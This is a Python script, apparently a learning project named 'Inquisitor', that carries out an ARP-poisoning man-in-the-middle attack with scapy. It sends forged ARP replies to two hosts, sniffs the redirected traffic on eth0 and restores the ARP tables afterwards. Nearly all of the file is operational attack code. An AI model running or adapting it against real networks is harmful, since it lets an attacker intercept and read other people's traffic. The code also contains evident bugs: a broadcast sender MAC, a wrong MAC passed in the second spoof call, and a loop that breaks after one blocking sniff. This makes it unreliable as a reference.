import argparse
import time
import scapy.all as scapy
from scapy.layers import inet

def optparsing() -> None:
    """
    parsing shell option arguments to program
    """
    parser = argparse.ArgumentParser(prog="Inquisitor", description="ARP poisoning in the middle attack")
    parser.add_argument(
        "src_ip",
        help="IP address of source"
    )
    parser.add_argument(
        "src_mac",
        help="Mac address of source"
    )
    parser.add_argument(
        "dest_ip",
        help="IP address of destination"
    )
    parser.add_argument(
        "dest_mac",
        help="Mac address of destination"
    )
    return parser.parse_args()


# def get_mac(ip: str):
#     arp_req_frame = scapy.ARP(pdst=ip)
#     broadcast_ether_frame = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
#     broadcast_ether_arp_req_frame = broadcast_ether_frame / arp_req_frame
#     answered_list = scapy.srp(broadcast_ether_arp_req_frame, timeout = 1, verbose = False)[0]
#     for answer in answered_list:
#         print(answer)
#     return answered_list[0][1].hwsrc

def spoof(src_ip, dest_ip, dest_mac):
    ## use local mac address as source
    spoof_packet = scapy.ARP(op = 2, hwsrc="ff:ff:ff:ff:ff:ff", psrc = src_ip, hwdst = dest_mac, pdst = dest_ip)
    scapy.send(spoof_packet, verbose = False)

def restore(src_ip, src_mac, dest_ip, dest_mac):
    ## use correct mac address and ip
    restore_packet = scapy.ARP(op = 2, psrc = src_ip, hwsrc = src_mac, pdst = dest_ip, hwdst = dest_mac)
    scapy.send(restore_packet, count =1, verbose = False)

def sniffer():
    scapy.sniff(iface='eth0', store = False, prn = process_packet)

def process_packet(packet):
    print('packet:', packet)

def poison(args):
    # spoof(src_ip, dest_ip)
    # spoof(dest_ip, src_ip)
    spoof(args.src_ip, args.dest_ip, args.dest_mac)
    spoof(args.dest_ip, args.src_ip, args.dest_mac)

def esuna(args):
    # restore(src_ip, dest_ip)
    # restore(dest_ip, src_ip)
    restore(args.src_ip, args.src_mac, args.dest_ip, args.dest_mac)
    restore(args.dest_ip, args.dest_mac, args.src_ip, args.src_mac)

def main():
    print(args.src_ip)
    # return
    packets_sent = 0
    try:
        while True:
            # spoof(dest_ip, src_ip)
            # spoof(src_ip, dest_ip)
            poison(args)
            packets_sent += 2

            print("\r[+] Packets Sent: {}".format(packets_sent), end = "")
            # packet = scapy.sniff(dest_ip)
            # print('Packet:', packet)
            sniffer()
            break
            time.sleep(2)
        # restore(dest_ip, src_ip)
        # restore(src_ip, dest_ip)
        esuna(args)

    except KeyboardInterrupt:
        print("\n[-] Detected Ctrl + C..... Restoring the ARP Tables..... Be Patient")
        # restore(dest_ip, src_ip)
        # restore(src_ip, dest_ip)
        esuna(args)
    except Exception as e:
        print(e)

if __name__ == '__main__':
    args = optparsing()
    print(args)
    main()
